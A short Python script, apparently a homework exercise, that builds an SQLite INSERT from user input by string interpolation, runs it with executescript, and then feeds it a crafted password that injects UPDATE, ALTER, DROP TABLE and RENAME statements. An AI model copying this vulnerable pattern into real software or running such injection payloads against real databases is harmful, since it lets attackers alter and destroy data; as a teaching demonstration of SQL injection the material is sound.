import sqlite3


def register(username: str, password: str) -> None:
    with sqlite3.connect('../homework.db') as conn:
        cursor = conn.cursor()
        sql_script = f"""
            INSERT INTO `table_users` (username, password)
            VALUES ('{username}', '{password}')  
            """
        cursor.executescript(
            sql_script
        )
        conn.commit()


def hack() -> None:
    username: str = "test_user"
    password: str = "test_password'); \n" \
                    "UPDATE table_users \
                    SET username = 'Кузнецова Я.И.2' \
                    WHERE id = 100;" \
                    "alter table table_users \
                    add column_name integer;" \
                    "DROP TABLE 'uefa_draw';" \
                    "ALTER TABLE uefa_commands \
                    RENAME TO uefa_commands_renamed;" \
                    "INSERT INTO `table_users` (username, password) \n" \
                    "VALUES ('username', 'password"
    register(username, password)


if __name__ == '__main__':
    #register('wignorbo', 'sjkadnkjasdnui31jkdwq')
    hack()
